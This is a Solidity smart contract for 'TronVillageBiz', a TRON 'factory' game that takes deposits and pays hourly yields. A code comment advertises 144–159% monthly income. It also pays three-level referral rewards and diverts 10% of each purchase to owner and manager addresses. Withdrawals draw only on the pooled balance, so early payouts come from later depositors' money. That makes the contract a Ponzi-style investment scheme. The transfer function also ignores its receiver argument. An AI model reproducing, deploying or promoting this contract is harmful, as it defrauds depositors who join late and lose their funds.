//SourceUnit: TronVillage.sol

		/***********\
	  /***************\
	/*******************\
  /***********************\
/***************************\
/*						   *\
/*						   *\
/* https://tronvillage.biz *\
/*						   *\
/*						   *\
\***************************/

pragma solidity ^0.4.25;

contract TronVillageBiz {

    using SafeMath for uint256;

    uint constant COIN_PRICE = 40000;
    uint constant TYPES_FACTORIES = 6;
    uint constant PERIOD = 60 minutes;
				
    uint[TYPES_FACTORIES] prices = [3000, 11750, 44500, 155000, 470000, 950000];
    uint[TYPES_FACTORIES] profit = [6, 24, 93, 330, 1020, 2100];
	// income per month:         144% 147% 150% 153% 156% 159%

    uint public totalPlayers;
    uint public totalFactories;
    uint public totalPayout;

    address owner;
    address manager;

    struct Player {
        uint coinsForBuy;
        uint coinsForSale;
        uint time;
        uint[TYPES_FACTORIES] factories;
    }

    mapping(address => Player) public players;
	mapping(address => address) public referrers;
	mapping(address => mapping(uint8 => uint256)) public refsReward;	
    constructor(address _owner, address _manager) public {
        owner = _owner;
        manager = _manager;
    }

    function deposit(address _referrer) public payable {
        require(msg.value >= COIN_PRICE);
		uint coinsForBuy = msg.value.div(COIN_PRICE);
		uint[TYPES_FACTORIES] memory factories = factoriesOf(_referrer);
        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
        }
		
		if (referrers[msg.sender] == address(0) && _referrer != msg.sender && (factories[0]+factories[1]+factories[2]+factories[3]+factories[4]+factories[5]) > 0) {
			referrers[msg.sender] = _referrer;
			if (coinsForBuy>=100) {
				refBonus(msg.sender, coinsForBuy, 1);		
				player.coinsForSale = player.coinsForSale.add(coinsForBuy.div(100));	
			}
		}
		
		player.coinsForBuy = player.coinsForBuy.add(coinsForBuy);		
		
    }

    function buy(uint _type, uint _number) public {
        require(_type < TYPES_FACTORIES && _number > 0);
        collect(msg.sender);

        uint paymentCoins = prices[_type].mul(_number);
        Player storage player = players[msg.sender];

        require(paymentCoins <= player.coinsForBuy.add(player.coinsForSale));

        if (paymentCoins <= player.coinsForBuy) {
            player.coinsForBuy = player.coinsForBuy.sub(paymentCoins);
        } else {
            player.coinsForSale = player.coinsForSale.add(player.coinsForBuy).sub(paymentCoins);
            player.coinsForBuy = 0;
        }

        player.factories[_type] = player.factories[_type].add(_number);
        players[owner].coinsForSale = players[owner].coinsForSale.add( paymentCoins.mul(7).div(100) );
        players[manager].coinsForSale = players[manager].coinsForSale.add( paymentCoins.mul(3).div(100) );

        totalFactories = totalFactories.add(_number);
    }

    function withdraw(uint _coins) public {
        require(_coins > 0);
        collect(msg.sender);
        require(_coins <= players[msg.sender].coinsForSale);

        players[msg.sender].coinsForSale = players[msg.sender].coinsForSale.sub(_coins);
        transfer(msg.sender, _coins.mul(COIN_PRICE));
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        require(player.time > 0);

        uint hoursPassed = ( now.sub(player.time) ).div(PERIOD);
        if (hoursPassed > 0) {
            uint hourlyProfit;
            for (uint i = 0; i < TYPES_FACTORIES; i++) {
                hourlyProfit = hourlyProfit.add( player.factories[i].mul(profit[i]) );
            }
            uint collectCoins = hoursPassed.mul(hourlyProfit);
            player.coinsForBuy = player.coinsForBuy.add( collectCoins.div(2) );
            player.coinsForSale = player.coinsForSale.add( collectCoins.div(2) );
            player.time = player.time.add( hoursPassed.mul(PERIOD) );
        }
    }

    function transfer(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                msg.sender.transfer(payout);
            }
        }
    }
    
	function findRef() external returns (address referrer) {
        return referrers[msg.sender];
    }
	
	function refBonus(address _player, uint256 _coinsForBuy, uint8 _level) internal {
		address _referrer = referrers[_player];
		uint256 _bonus = 5;
		if (_referrer != address(0)) {
			if (_level == 2) _bonus = 3;
			if (_level == 3) _bonus = 1;
			uint256 _refBonus = _coinsForBuy.mul(_bonus).div(100);
			refsReward[_referrer][_level] = refsReward[_referrer][_level].add(_refBonus);
			Player storage player = players[_referrer];
			player.coinsForSale = player.coinsForSale.add(_refBonus);			
			if (_level < 3) {
				refBonus(_referrer, _coinsForBuy, _level+1);
			}
		}
	}	
	
    function factoriesOf(address _addr) public view returns (uint[TYPES_FACTORIES]) {
        return players[_addr].factories;
    }
	
    function coinsOf(address _addr) public view returns(uint treasury, uint spare) {
        uint hourlyProfit;
        uint time;
        uint[TYPES_FACTORIES] memory factories = factoriesOf(_addr);

        for (uint i = 0; i < TYPES_FACTORIES; i++) {
            hourlyProfit += factories[i] * profit[i];
        }
		
        treasury = players[_addr].coinsForBuy;
		spare = players[_addr].coinsForSale;
		time = players[_addr].time;

        uint collectCoins = ((now - time) / PERIOD)  * hourlyProfit;
        treasury += collectCoins / 2;
        spare += collectCoins / 2;
    }	

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}